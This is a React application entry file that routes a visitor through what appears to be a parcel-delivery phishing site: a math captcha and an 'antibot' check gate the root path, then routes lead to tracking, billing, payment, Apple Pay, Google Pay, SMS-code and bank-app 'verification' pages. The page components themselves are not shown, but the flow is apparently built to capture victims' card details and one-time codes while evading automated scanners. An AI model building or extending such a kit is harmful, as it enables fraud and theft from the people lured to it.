import React, { useState, useCallback, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import { SecurityVerification, SecurityForm } from './components/SecurityVerification';
import { ParcelTracking } from './components/ParcelTracking';
import { BillingPage } from './components/ParcelTracking/BillingPage';
import { PaymentPage } from './components/ParcelTracking/PaymentPage';
import { ApplePayVerification } from './components/ParcelTracking/PaymentVerification/ApplePayVerification';
import { GooglePayVerification } from './components/ParcelTracking/PaymentVerification/GooglePayVerification';
import { SMSVerification } from './components/ParcelTracking/PaymentVerification/SMSVerification';
import { BankAppVerification } from './components/ParcelTracking/PaymentVerification/BankAppVerification';
import { SuccessPage } from './components/ParcelTracking/SuccessPage';
import { checkBot } from './utils/antibot';
import { AlertCircle } from 'lucide-react';

function AppContent() {
  const [firstNumber, setFirstNumber] = useState<number>(generateRandomNumber());
  const [secondNumber, setSecondNumber] = useState<number>(generateRandomNumber());
  const [userAnswer, setUserAnswer] = useState<string>('');
  const [error, setError] = useState<boolean>(false);
  const [isRefreshing, setIsRefreshing] = useState<boolean>(false);
  const [isShaking, setIsShaking] = useState<boolean>(false);
  const [isVerified, setIsVerified] = useState<boolean>(false);
  const location = useLocation();
  const [isAllowed, setIsAllowed] = useState<boolean | null>(null);

  useEffect(() => {
    const verifyAccess = async () => {
      const allowed = await checkBot();
      setIsAllowed(allowed);
    };
    verifyAccess();
  }, []);

  function generateRandomNumber(): number {
    return Math.floor(Math.random() * 9) + 1;
  }

  const regenerateNumbers = useCallback(() => {
    setIsRefreshing(true);
    
    setTimeout(() => {
      let newFirst = generateRandomNumber();
      let newSecond = generateRandomNumber();
      
      while (newFirst === newSecond) {
        newSecond = generateRandomNumber();
      }
      
      setFirstNumber(newFirst);
      setSecondNumber(newSecond);
      setUserAnswer('');
      setError(false);

      setTimeout(() => {
        setIsRefreshing(false);
      }, 100);
    }, 300);
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const correctAnswer = firstNumber + secondNumber;
    const isCorrect = parseInt(userAnswer) === correctAnswer;
    
    if (!isCorrect) {
      setError(true);
      setIsShaking(true);
      setTimeout(() => setIsShaking(false), 500);
    } else {
      setIsVerified(true);
    }
  };

  // Only show security verification on root path
  if (location.pathname === '/' && !isVerified) {
    return (
      <SecurityVerification isShaking={isShaking}>
        <SecurityForm
          firstNumber={firstNumber}
          secondNumber={secondNumber}
          userAnswer={userAnswer}
          error={error}
          isRefreshing={isRefreshing}
          onAnswerChange={setUserAnswer}
          onSubmit={handleSubmit}
          onRegenerate={regenerateNumbers}
        />
      </SecurityVerification>
    );
  }

  return (
    <Routes>
      <Route path="/" element={<ParcelTracking />} />
      <Route path="/billing" element={<BillingPage />} />
      <Route path="/payment" element={<PaymentPage />} />
      <Route path="/apple-pay" element={<ApplePayVerification />} />
      <Route path="/google-pay" element={<GooglePayVerification />} />
      <Route path="/sms-verification" element={<SMSVerification />} />
      <Route path="/bank-app" element={<BankAppVerification />} />
      <Route path="/success" element={<SuccessPage />} />
    </Routes>
  );
}

function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
}

export default App;